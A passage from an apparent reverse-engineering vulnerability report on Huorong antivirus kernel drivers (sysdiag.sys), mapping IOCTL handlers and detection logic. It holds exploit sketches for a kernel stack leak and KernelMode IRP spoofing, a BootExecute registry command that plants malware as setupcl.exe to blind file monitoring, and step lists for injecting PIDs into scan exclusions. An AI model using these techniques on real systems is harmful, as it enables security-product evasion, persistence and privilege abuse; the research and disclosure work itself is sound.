`v5` is the user-accessible output buffer (`SystemBuffer` from METHOD_BUFFERED). After the call to `sub_1400611D0`, the handler writes 16 bytes from the uninitialized stack positions `[rsp+70h]` and `[rsp+78h]` directly into the output — whatever was previously on the kernel stack at those offsets.

**Contents of the leaked 16 bytes** (depends on call chain, varies per invocation):
- Kernel virtual addresses (from prior function calls on the same kernel stack)
- Return addresses pointing into `sysdiag.sys` or `ntoskrnl.exe` image ranges → KASLR defeat
- Kernel pool pointers from prior allocations
- Saved register values containing sensitive data

**Exploit:**
```c
HANDLE hUtils = CreateFileA("\\\\.\\SysDiag::SysUtils",
    GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);

QWORD out[2] = {0, 0};
QWORD in[2];
in[0] = some_handle;   // passed to sub_1400611D0
DeviceIoControl(hUtils, 0x220060, in, 0x10, out, 0x10, &ret, NULL);
// out[0] = [rsp+70h] kernel stack value
// out[1] = [rsp+78h] kernel stack value
// → deduce ntoskrnl.exe base (KASLR bypass) from returned kernel text pointer
```

#### SysDiag::SysUtils IOCTL Table (abbreviated)

`sub_1400627D0` handles 20 IOCTL codes. Noteworthy entries:

| IOCTL | Hex | Action |
|-------|-----|--------|
| `2228224` | `0x220000` | Returns `DWORD 0x10003` (version) |
| `2228228` | `0x220004` | `IP6_SET_ADDR_ANY` — zeros 16 bytes of input buffer (unusual) |
| `2261004` | `0x22800C` | `sub_140061A30(handle, flags)` — opens object by handle |
| `2261008` | `0x228010` | `sub_140061A70` |
| `2261012` | `0x228014` | `sub_140061860` — object lookup + linked-list insertion (FastMutex protected) |
| `2261016` | `0x228018` | Linked-list walk by handle → deref + remove (FastMutex, LABEL_62) |
| `2228296` | `0x220048` | `sub_140061680` — checks `ExGetPreviousMode()` (only IOCTL with privilege check) |
| `2228316` | `0x22005C` | `sub_140061AB0` — query/compute |
| `2228320` | `0x220060` | **UNINITIALIZED STACK DISCLOSURE** (Flaw 29) |
| `2261052` | `0x22803C` | `sub_140060CA0` |
| `2261072` | `0x228050` | `sub_140060CD0` — linked-list node remove via IRQL-elevated loop |
| `2228324` | `0x220064` | `sub_140060ED0(handle)` → returns handle info |
| `2228328` | `0x220068` | `sub_140060ED0(handle)` → fills different output offset |

Note: IOCTL `0x220048` is the **only** handler in `SysDiag::SysUtils` that checks `ExGetPreviousMode()`. All other handlers execute without caller privilege validation.

---

### 33.4 nxeng Device — Hypervisor Engine IPC (`sub_140001CE0`)

**Severity: MEDIUM** — World-accessible hypervisor control interface; potential for VM escape or hypervisor state manipulation.

`\Device\nxeng` (created by `sub_140060580`) exposes a stateful streaming IPC mechanism:

| IOCTL | Action |
|-------|--------|
| `0x227044` | Create channel — allocates FsContext object (magic `"HV-MAGIC"` = `0x48562D4D41474943`), assigns to `FileObject->FsContext` |
| `0x228008` | Channel read: `sub_140006030` |
| `0x22800C` | Channel write or reset: `sub_140006300` / `sub_1400061E0` |
| `0x228010` | Channel complex R/W: `sub_1400064A0` / `sub_1400063E0` |
| `0xC0235F54` | Large data transfer (min 911 bytes): copies 912 bytes to/from FsContext + calls `sub_1400029D0` |
| `0xC0235F58` | Small data transfer (16 bytes): `sub_140006540` |
| `0x224A1C` | Query channel info: returns 68-byte descriptor from FsContext |

The IOCTL codes `0xC0235F54`/`0xC0235F58` use a non-standard device type (`0xC023`), suggesting they are routed from a different device type via the same handler — possibly hypervisor control codes forwarded from a VM guest.

No per-IOCTL access control beyond the world-accessible DACL. An unprivileged process can open a channel and invoke the full hypervisor IPC API.

---

---

## §34 — Additional IOCTLs: IRP Spoofing and Object Info (Flaw 30)

**Date analyzed:** 2026-06-05  
**Source:** `sysdiag.sys` — SysDiag::IOKit IOCTLs 0x220440, 0x220444, 0x22043C

---

### 34.1 Flaw 30 — IOCTL 0x220440: Kernel-Mode IRP Spoofing Against Arbitrary Device Objects

**Severity: HIGH** — Any local user can send a kernel-mode `IRP_MJ_SET_INFORMATION` to any device object reachable through the IOKit object system, bypassing `KernelMode` trust checks in target drivers.

#### Code (`sub_14005E740` @ `0x14005E740`)

```c
// Called from IOCTL 0x220440 (CTL_CODE(0x22, 272, METHOD_BUFFERED, ANY))
// a1 = handle to target device object (from IOCTL 0x228004 / 0x228028)
// a2 = handle to source object
// a3 = user-controlled data [0..1] = uint16 length, [8..N] = payload

sub_14005E290(a1, &target_dev);   // look up target device file object
sub_14005E290(a2, &src_obj);      // look up source object

// Allocate user-supplied payload structure:
size_t irp_data_size = *(uint16_t*)a3 + 24;
void *custom_irp_data = alloc(irp_data_size);
custom_irp_data[0]  = 0;
custom_irp_data[8]  = src_obj_handle;
custom_irp_data[16] = *(uint16_t*)a3;      // user-controlled length
memmove(custom_irp_data + 20, a3[1], *(uint16_t*)a3);  // user payload

// Build and send IRP:
PIRP irp = IoAllocateIrp(target_device->StackSize + 1, FALSE);
irp->AssociatedIrp.MasterIrp = (PIRP)custom_irp_data;  // ← user data as MasterIrp
irp->RequestorMode = 0;           // ← KernelMode! Bypasses user-mode checks in target
irp->Flags |= 0x810;              // IRP_SYNCHRONOUS_API | IRP_NOCACHE

// Set IRP_MJ_SET_INFORMATION stack parameters:
stack->MajorFunction = 6;         // IRP_MJ_SET_INFORMATION
stack->Parameters.Create.Options = 10;          // FileInformationClass
stack->Parameters.Read.Length = irp_data_size;  // user-controlled
stack->Parameters.SetFile.ReplaceIfExists = custom_irp_data->Type;  // user-controlled

IofCallDriver(target_device, irp);
KeWaitForSingleObject(&target_file->Event, ...);
```

#### Impact

1. **KernelMode trust bypass:** `RequestorMode = 0` means the receiving driver's IRP handler sees `KernelMode` as the caller. Any driver that gates operations on `PreviousMode == KernelMode` or `ExGetPreviousMode() == 0` will trust these requests unconditionally.

2. **Arbitrary `IRP_MJ_SET_INFORMATION`:** User controls `FileInformationClass = 10` (`FileRenameInformation`), the payload length, and the payload content (via `a3[1]`). If the target driver implements SET_INFORMATION and the information class is 10 (rename), this could trigger file rename operations with kernel-mode privileges.

3. **Against any device object:** Combined with IOCTL 0x228004 (which opens kernel objects by address), an attacker can target any device object in the system, not just those registered with IOKit.

#### Exploit Sketch
```c
// 1. Get reference to a target device (e.g., \Device\HarddiskVolume1)
HANDLE hIOKit = CreateFileA("\\\\.\\SysDiag::IOKit", GENERIC_ALL, ...);

// 2. Open the target device object via IOCTL 0x228004
//    (uses kernel VA from 0x228050 to locate device object)

// 3. Send kernel-mode SET_INFORMATION via IOCTL 0x220440
struct { uint16_t len; uint16_t pad; void* payload_ptr; } a3;
DeviceIoControl(hIOKit, 0x220440, ...);
// Target driver receives IRP with RequestorMode=KernelMode
```

### 34.2 IOCTL 0x22043C — Object Property Query (low severity)

`sub_14005EA00`: looks up a kernel IOKit object, queries two property modes (4 and 5 via `sub_14005E3C0`), returns a 44-byte structure with object metadata. No dangerous operations — used by Huorong's own processes to introspect kernel objects. No exploitation potential beyond information disclosure of object addresses.

### 34.3 IOCTL 0x220444 — Object State Change (low severity)

`sub_14005E6C0`: queries object in mode 4, then calls `sub_14005E540(Object, 4, result)` — a state setter. User-supplied `a2` (`int`) is saved as `v7 = a2` but not observed to affect kernel state directly. Likely a "configure object" command for IOKit-managed objects.

---

---

## §35 — HR::DTrampo Access Control Bypass + TrampoLib Session Exposure (Flaw 31)

**Date analyzed:** 2026-06-05  
**Source:** `sysdiag.sys` — `\Device\HR::DTrampo` IRP_MJ_CREATE and IOCTL handler  
**Impact: HIGH** — Any local user can open the TrampoLib inline hook engine and manipulate Huorong's internal process trust state.

---

### 35.1 Access Control Asymmetry Across HR:: Devices

`sub_14000E800` dispatches based on the target device object:

| Device | IRP_MJ_CREATE Access Check | Result for Unknown Process |
|--------|---------------------------|---------------------------|
| `HR::ActMon` | `PsGetCurrentProcessId` → `sub_140034D30(pid)` → check `[record+2712]` | STATUS_ACCESS_DENIED |
| `HR::Base` | Same check as ActMon | STATUS_ACCESS_DENIED |
| `HR::DTrampo` | `sub_1400137B0` → `return sub_14000BD80(a3, 0, 0)` | **STATUS_SUCCESS** (no check!) |

All three devices share the DACL `"D:P(A;;GA;;;WD)"` (Everyone GENERIC_ALL), but HR::ActMon and HR::Base add a secondary check against Huorong's internal process table. **HR::DTrampo has no secondary check** — any process (any user, any integrity level) can open it.

### 35.2 IOCTL Handler (`sub_140013440`) — TrampoLib Engine IOCTLs

**IOCTL 0x228014 (2261012) — Create TrampoLib Hook Session:**

```c
// Allocates a TrampoLib session object:
void *session = sub_140012FB0();  // alloc session struct

// Maps a 4096-byte shared kernel buffer into caller's address space:
void *shared_buf = sub_14000B6E0(
    session + 16,           // kernel-side VA of session buffer
    qword_14007BAC8,        // some global (pool/MDL base?)
    4096,                   // buffer size
    *v5                     // user-supplied handle/parameter
);

// Store in FileObject->FsContext[24]:
InterlockedExchange64(IrpStack->FileObject->FsContext + 24, session);

// Output[8..15] = shared_buf (user VA to the shared kernel buffer)
v5[1] = shared_buf;
```

This gives any caller a shared 4096-byte buffer directly mapped to a kernel session object — without privilege check. The buffer is used to pass hook specifications to TrampoLib.

**IOCTL 0x220418 (2228248) — Signal Hook Event:**
```c
void *session = IrpStack->FileObject->FsContext[24];
KeSetEvent(session + 16);  // trigger TrampoLib processing of the session buffer
```

After writing hook data to the shared buffer, the caller signals the event to invoke TrampoLib processing. Combined, these two IOCTLs allow installing inline hooks via TrampoLib without being a trusted Huorong component.

**IOCTL 0x220428 (2228264) — Query Process Trust State:**

```c
// Input: [0..7] = PID to query; [8..15] = secondary value
// Output [8..11] = flags:
//   bits 1-0: exclusion type (0=none, 1=slot1, 2=slot2, 3=slot3)
//   bits 3-2: [process+2712] trust level encoded
//   bit 4: [process+546] status bit

if (sub_1400176B0(pid))       // in main exclusion slot?
    output |= 1;
else if (sub_140017840(pid))  // in secondary slot?
    output |= 2;
else if (sub_1400177A0(pid))  // in third slot?
    output |= 3;

// Read internal process record:
record = sub_140034D30(pid);
output ^= (output ^ (4 * record[+2712] + 4)) & 0xC;   // trust level → bits 3-2
output ^= (output ^ (4 * record[+546])) & 0x10;        // status bit → bit 4
```

Any process can query Huorong's trust level for any PID, including determining which Huorong process holds the main exclusion slot.

**IOCTL 0x220430 (2228272) — Modify Process Status Bit:**

```c
// Input: [0..3] = 0 (required), [4..11] = target PID
if (*(_DWORD*)input == 0) {
    record = sub_140034D30(input[4..11]);  // lookup target PID's record
    if (record)
        record[+546] |= 4u;  // set bit 2 of status byte
}
```

Any unprivileged process can set bit 2 of `[process_record + 546]` for **any arbitrary PID**. Combined with IOCTL 0x220428 which encodes [+546] into the query output, this affects how DTrampo classifies the target process's trust level.

### 35.3 Impact

1. **TrampoLib hook installation by untrusted process**: IOCTL 0x228014 + 0x220418 → any user installs inline hooks via Huorong's hook engine. Specific hook targets depend on qword_14007BAC8 and the shared buffer format (not yet reversed), but the channel is open.

2. **Process trust enumeration**: IOCTL 0x220428 reveals which processes are in Huorong's exclusion tables — useful intelligence for bypass attacks.

3. **Trust state manipulation**: IOCTL 0x220430 modifies Huorong's internal process classification state for arbitrary PIDs, potentially affecting monitoring decisions.

---

## 36. sysdiag.sys — Process Event Handler Hash Map (sub_14001A530) — FULLY CRACKED

### 36.1 Hash algorithm

`sub_140014480` @ 0x140014480: standard CRC32 (polynomial 0xEDB88320, table @ 0x140070010)
on UTF-16LE lowercase basename bytes. Output: `(char_count << 32) | crc32`.
Identical to `zlib.crc32()` in Python. Case-fold via `byte_140064AD0` tolower table.

**Loop 3 at 0x14001BC30 uses a DIFFERENT hash (MurmurHash2A):** multiply 0x5BD1E995,
shift 18, XOR, used for sub_14004D360 call. NOT used for process identification.

### 36.2 LOLBin monitoring list — 8 entries (14001A5AF–14001A62E)

Immediately after `sub_140014480` call. Any match → `sub_140017B60(rdi)`:

| Addr | Hash (64-bit) | Len | Process | Significance |
|------|---------------|-----|---------|-------------|
| 14001a5af | 0x74D32E3C5 | 7 | **cmd.exe** | CMD shell |
| 14001a5c5 | 0xB1DC7157D | 11 | **cscript.exe** | WSH COM script |
| 14001a5d4 | 0xBE891CC3C | 11 | **wscript.exe** | WSH script |
| 14001a5e3 | 0x921FC72DB | 9 | **mshta.exe** | HTA/VBScript |
| 14001a5f2 | 0x7DB6A6488 | 7 | **net.exe** | network enum |
| 14001a601 | 0xE19A262E9 | 14 | **powershell.exe** | PS execution |
| 14001a610 | **0xCA07778F0** | 12 | **vssadmin.exe** | VSS shadow copy admin |
| 14001a61f | 0x878ECEFBD | 8 | **wmic.exe** | WMI CLI |

**vssadmin.exe** is Huorong's ransomware indicator — `vssadmin delete shadows` is the canonical ransomware anti-backup command. Any execution triggers `sub_140017B60`.

### 36.3 Windows system PID tracking — 6 globals (14001BD94–14001BF10)

| Hash (64-bit) | Len | Process | Global var | Purpose |
|---------------|-----|---------|------------|---------|
| 0x9373B8320 | 9 | **lsass.exe** | `qword_1400FE068` | LSASS PID for credential theft detection |
| 0x9DB973EFF | 9 | **csrss.exe** | `qword_1400FE090[session*8]` | Per-session csrss table (≤64 entries) |
| 0x86D5C274F | 8 | **smss.exe** | `qword_1400FE078` | Session manager PID |
| 0xC2C33AE73 | 12 | **services.exe** | `qword_1400FE070` | SCM PID |
| 0xCDD5B8EB3 | 12 | **winlogon.exe** | `qword_1400FE490[session*8]` | Per-session winlogon table |
| 0xBE4696042 | 11 | **wininit.exe** | `qword_1400FE290[session*8]` | Session 0 init PID (Win 8+, NtBuild ≥ 0x1770) |

`qword_1400FE068` = lsass.exe PID — used in file-open callbacks to detect attempts to read lsass memory.
`WorkerRoutine` (0x14001C210) clears ALL slots on process termination.

### 36.4 Huorong trusted process tracking (14001BExx)

| Hash (64-bit) | Len | Process | Effect |
|---------------|-----|---------|--------|
| 0xEDC78FE1F | 14 | hipsdaemon.exe | threat_level check, sets dword_1400730B0 |
| 0xC1269ECD8 | 12 | hipstray.exe | calls sub_140016160 (trusted path 1) |
| 0xCAF74FC07 | 12 | hrupdate.exe | calls sub_140016160 (trusted path 2) |

### 36.5 File monitoring exclusion slot — CRITICAL BYPASS (14001BE72–14001BE9F)

**Slot:** `qword_1400FE080` — set to PID of `setupcl.exe` child of smss.exe.

```asm
14001be7f  mov rdx, 0B65BAFAF9h   ; setupcl.exe (11 chars, CRC32=0x65BAFAF9)
14001be89  cmp [rsi], rdx          ; is current process setupcl.exe?
14001be8c  jnz short loc_14001BEA4
14001be8e  cmp [rdi+38h], rax      ; parent PID == smss.exe PID?
14001be92  jnz short loc_14001BEA4
14001be94  mov rax, [rdi+30h]
14001be98  mov cs:qword_1400FE080, rax  ; set exclusion = setupcl.exe PID
```

**What setupcl.exe is:** Windows Setup Client — spawned by smss.exe during Sysprep/OOBE
for SID regeneration and setup clone operations (`C:\Windows\System32\setupcl.exe`).
Huorong excludes it from minifilter file monitoring to avoid false positives during deployment.

**Exclusion check:** `sub_140017780` (6 instructions):
```c
bool is_excluded(HANDLE pid) { return pid != 0 && pid == qword_1400FE080; }
```
Called from `sub_140048E90` (minifilter file rule matcher) and `sub_14004C670`.

**Slot lifecycle:** Set when setupcl.exe starts → cleared by WorkerRoutine when setupcl.exe terminates.

### 36.6 Trusted browser/app block (14001BFD7–14001C08A)

**Bit setter (0x16615FAE6C, one entry):** sets bit 0 of `[rdi+220h]`
**Bit clearer (10 entries):** clears bit 3 of `[rdi+223h]`

Identified entries (partially):

| Hash (64-bit) | Len | Identified | Effect |
|---------------|-----|------------|--------|
| 0x16615FAE6C | 22 | unknown | set [+220h] bit 0 |
| 0xC039B84A3 | 12 | **iexplore.exe** | clear [+223h] bit 3 |
| 0xA0AC7C71B | 10 | unknown browser | clear [+223h] bit 3 |
| 0xA7E9AB66D | 10 | unknown browser | clear [+223h] bit 3 |
| 0xB0996E341 | 11 | unknown browser | clear [+223h] bit 3 |
| 0xC095E2844 | 12 | unknown browser | clear [+223h] bit 3 |
| 0xDA4FA9467 | 13 | unknown browser | clear [+223h] bit 3 |
| 0xEBE1CD134 | 14 | unknown browser | clear [+223h] bit 3 |
| 0x106162B79F | 16 | unknown browser | clear [+223h] bit 3 |
| 0x11E0E5AF8C | 17 | unknown browser | clear [+223h] bit 3 |
| 0x82F5F0F55 | 8 | unknown | clear [+223h] bit 3 |

Likely browsers: chrome.exe(10), firefox.exe(11), msedge.exe(10), QQBrowser.exe(12), 360chrome.exe(13)...

### 36.7 WINDEPLOY.EXE path wildcard (14001C0E1)

`FsRtlIsNameInExpression("*\\SYSTEM32\\OOBE\\WINDEPLOY.EXE", process_path)` →
if matches: `xchg r15d, cs:dword_140078F58` — sets OOBE-mode flag (prevents certain monitoring).

### 36.8 Dynamic whitelist bsearch (14001C195)

`bsearch([rsi], qword_14007ACC8, dword_14007ACD0, 8, comparator)` — binary search over
dynamic runtime table loaded from user space. Matches → sets `[rdi+0xAC8] = 0` (disable scan bit).
Protected by `NdisAcquireReadWriteLock` or `ExAcquireResourceSharedLite`.

### 36.9 Flaw 18a: setupcl.exe PPID-spoof file monitoring bypass

**Mechanism:** Register malware as `setupcl.exe` in
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute` or via PPID spoofing.
When smss.exe spawns the executable:
1. sysdiag.sys sets `qword_1400FE080` = malware PID
2. `sub_140048E90` returns 0 for ALL file access checks by this PID
3. Malware has unrestricted file I/O — Huorong's minifilter fully blind

**Conditions required:**
- Process filename must be `setupcl.exe` (hash check only — no path/sig verification)  
- Parent PID must equal `qword_1400FE078` (smss.exe's PID)
- `qword_1400FE080` must be unset (first valid child of smss.exe with this name wins)

**BootExecute attack:**
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0setupcl" /f
copy malware.exe C:\Windows\System32\setupcl.exe
```
At next boot: smss.exe executes `C:\Windows\System32\setupcl.exe` → exclusion set → bypass.

**Severity:** HIGH — full bypass of Huorong file monitoring with NO kernel exploit needed,
persists across reboots via BootExecute.

---

## 37. sysdiag.sys — LOLBin Detection Pipeline (Session 4 analysis)

### 37.1 sub_140017B60 — Command-line normalizer (NOT a terminator)

Called from `sub_14001A530` (14001A631) and `sub_140014AE0` (140014C57) for LOLBin processes.

**What it does:** Strips the executable name from the command line, re-quotes remaining
arguments using Windows CommandLineToArgvW-compatible rules (handles `"`, `\`, `:` escaping),
atomically replaces `[ctx+0x78]` (command-line wchar ptr) with the normalized form.

Key internal checks:
- **`USER` 4-char detection** (14001E02): case-insensitive match `(w-'U')&0xFFDF==0` ×4 chars.
  Specifically identifies `net user` argument. Sets `v1` flag for special quote re-insertion.
- **Path-separator check**: detects drive-letter paths (`C:\...`) via `:` + `\` sequence.
  Sets `v3` flag. If `v3` == true → executes atomic swap:
  ```
  _InterlockedCompareExchange64([ctx+120], normalized_buf, original_buf)
  [ctx+547] |= 4   // bit 2 = "cmdline normalized"
  [ctx+144]  = original_buf  // preserves original
  ```
- **Pool alloc/free**: `sub_14000AE70` (alloc), `sub_14000AD50` (free)

**Bypass note:** If no path separator found in arguments (`v3 == 0`), the normalized buffer is
freed and `[ctx+120]` is NOT updated. Running `cmd.exe` without arguments produces no cmdline
swap — but LOLBin flag from `sub_14001A530` is still set.

---

### 37.2 sub_140014AE0 — Process creation/deletion handler

**Creation path (a3 != 0):**
1. Increment refcount `*a5`
2. `sub_1400151F0(a2, a1, CurrentProcessId, a4)` → lookup/create process context v11
3. Set bit 7 of `[v11+545]` = "processing"
4. `sub_1400470C0(&image_path)` → compute image hash
5. `sub_140047490(v15, hash, &image_path, flags)` → trust check (returns 2 = trusted)
6. Read `v19 = *(_QWORD *)(v11 + 0x210)` — **8-value LOLBin path hash check**:
   ```
   0x1D9915001F123626  0x92633F1609484713
   0xB85EBC72C448E76E  0x48F2111C15C6E247
   0x42734A7C1AE5A976  0x5331531C4A77BEFA
   0x34B2A33C997CBA46  0x3C8D455F370F660E
   ```
   These are **MurmurHash2A** (seed=0x19870714, mult=0x5BD1E995) of the 8 LOLBin IMAGE PATHS
   (NT format, UTF-16LE, `| 0x20202020` per-DWORD for case folding).
   On match: call `sub_140017B60(v11)` (cmdline normalize).
7. `sub_140036910(v11, &image_path, &cmdline, ...)` — secondary detection step
8. `sub_140026C10(0, 0, 0, handle, 0, 0, 0, 3, &cmdline, -1, 0, v11)` — **main scan, mode 3**
9. `sub_140026AD0(...)` — report/alert dispatch
10. If detected (`v20`): `sub_140035170(v11)` — **ZwTerminateProcess**
    Else: `sub_140017EF0` + `sub_140022F70` + `sub_140042050` + `sub_14000F190` (allow)
11. `sub_140035270(v11)` — release context ref

**Deletion path (a3 == 0):**
- Acquires `Lock` (NDIS or ERESOURCE based on `byte_140079380 & 2`)
- `sub_1400343C0(a2)` → find process entry in table, unlink it
- Queues `WorkerRoutine` IoWorkItem via `IoAllocateWorkItem` + `IoQueueWorkItem`

---

### 37.3 sub_140026C10 — Main scan dispatcher

Signature: `sub_140026C10(mode, flags, a3, handle, a5, a6, a7, type, cmdline, -1, img_path, ctx)`

**Early exits:**
- `KeGetCurrentIrql() >= 2` → return 0 (no scan at DISPATCH_LEVEL)
- `[ctx+545] & 0x20` → return 0 (bit 5 = "excluded/done")
- `a1==1 && sub_1400176B0(handle)` → return 0 (csrss PID exclusion, see §37.4)
- `MEMORY[0xFFFFF78000000014] - [ctx+16] >= 0x989680` → set `[ctx+547] |= 1` (stale process flag)

**Hash computation:** Computes MurmurHash2A on both cmdline and image path:
```
seed = 0x19870714, mult = 0x5BD1E995 (= 1540483477)
For each 4-byte chunk: val |= 0x20202020  // case fold (turns null bytes → 0x20)
Output: v137 (64-bit hash of cmdline path), v138 (64-bit hash of cmdline extension)
        v143 (64-bit hash of image path),   v144 (64-bit hash of image extension)
```

**Dispatch by mode:**
| a1 | Function | Flag set on detect | Meaning |
|---|---|---|---|
| 1 | `sub_14004BC80` | `[ctx+546] \|= 0x10` | file-based scan |
| 2 | `sub_14004C670` | `[ctx+546] \|= 0x20` | network/LSASS? |
| 3 | `sub_14004C200` | `[ctx+546] \|= 0x40` | behavior scan |

On detection (`v126 = 1`): queues event via `sub_140032FA0(sub_1400296C0, Dst)`, then
iterates rule list from v136 linked list, calls `sub_140009990` per rule (user-mode verdict wait,
600-second timeout = `-600000000` units of 100ns).

---

### 37.4 sub_1400176B0 — csrss PID table exclusion check

Called from `sub_140026C10` for scan mode 1 ONLY.

```c
__int64 sub_1400176B0(uint64_t pid) {
    if (!pid) return 0;
    if (!dword_1400FE060 || sub_140034D30(pid) == 0) {
        // Linear scan: qword_1400FE090 → qword_1400FE290 (64 slots × 8 bytes)
        for (uint64_t *p = qword_1400FE090; p < qword_1400FE290; p++)
            if (*p == pid) return 1;  // csrss PID found → excluded
        return 0;
    }
    // Has process context: check bit 0 of [ctx+546] AND csrss hash at [ctx+2768]
    if (([ctx+546] & 1) && [ctx+2768] == 0x9DB973EFF) return 1;  // csrss → excluded
    return 0;
}
```

**qword_1400FE090** = csrss.exe PID table (64 slots, per-session, offset 0 = session 0)
**qword_1400FE290** = first entry of wininit table = used as END sentinel for csrss scan
Table span: 0x1400FE090 → 0x1400FE290 = 512 bytes = 64 × 8-byte PID slots

**Exclusion logic:** Any PID in the csrss table bypasses ALL mode-1 scan in `sub_140026C10`.

---

### 37.5 sub_140035170 — Process terminator

```c
BOOL sub_140035170(__int64 ctx) {
    EPROCESS *proc = *(EPROCESS **)(ctx + 8);  // [ctx+8] = EPROCESS* of target
    HANDLE hProcess;
    if (!proc || ObOpenObjectByPointer(proc, OBJ_KERNEL_HANDLE, 0, 0,
                                       PsProcessType, KernelMode, &hProcess) < 0)
        return FALSE;
    BOOL ok = (ZwTerminateProcess(hProcess, 0) >= 0);
    ZwClose(hProcess);
    return ok;
}
```

**Note:** `OBJ_KERNEL_HANDLE` (0x200) = handle only valid in kernel mode. Completely bypasses
PPL handle constraints — Huorong can kill ANY process including Protected Processes.
Called when `sub_140026C10` returns detected (v20 != 0) in `sub_140014AE0`.

---

### 37.6 Flaw 18b — csrss PID table injection via IOCTL write

**Attack:** Use IOCTL 0x22804C (arbitrary kernel write) from `\\.\SysDiag::IOKit` to inject
any PID into the csrss table at `qword_1400FE090`:

```
Step 1: IOCTL 0x228050 → get kernel VA anchor → walk to find sysdiag.sys base
Step 2: Compute VA of qword_1400FE090 = sysdiag_base + (0x1400FE090 - 0x140000000)
Step 3: IOCTL 0x228048 mode 0 → read current csrss table, find empty slot (value=0)
Step 4: IOCTL 0x22804C mode 0 → write target PID into empty slot
Step 5: All mode-1 scans for that PID return 0 (excluded)
```

**Severity:** HIGH — requires Huorong running (guaranteeing sysdiag.sys loaded), but then
uses Huorong's OWN IOCTL to suppress its own scanning. No PPID spoof, no BootExecute,
no registry modification required.

---

## 10. Remaining Gaps (minimal)

### 10.1 hrfwdrv.sys — file not present in research directory
- Firewall driver: NDIS-level inbound/outbound packet blocking
- Handles rules from `IPFltProto_60` DB (already schema-decoded in §14.2)
- Likely similar architecture to hrndis6.sys (NDIS LWF) but with blocking capability

### 10.2 hrelam.sys — file not present
- ELAM early-launch driver
- Registered at HKLM\...\Services\hrelam

### 10.3 IOCTL dispatch for HR::ActMon — internal only
- Device created via `IoDevObjCreateDeviceSecure` with SDDL string (PAGE section)
- IOCTL codes fully mapped via uactmon.dll analysis (§5.2)
- Dispatch: `sub_14000AA40` → `off_140078490` vtable → `vtable[MajorFunc+4]`

### 10.4 libvxf.dll / AMS internals
- The actual pattern matching engine inside libvxf.dll
- AMS_SearchPatterns likely uses Aho-Corasick or similar multi-pattern algorithm
- Database format: binary compiled patterns + string table
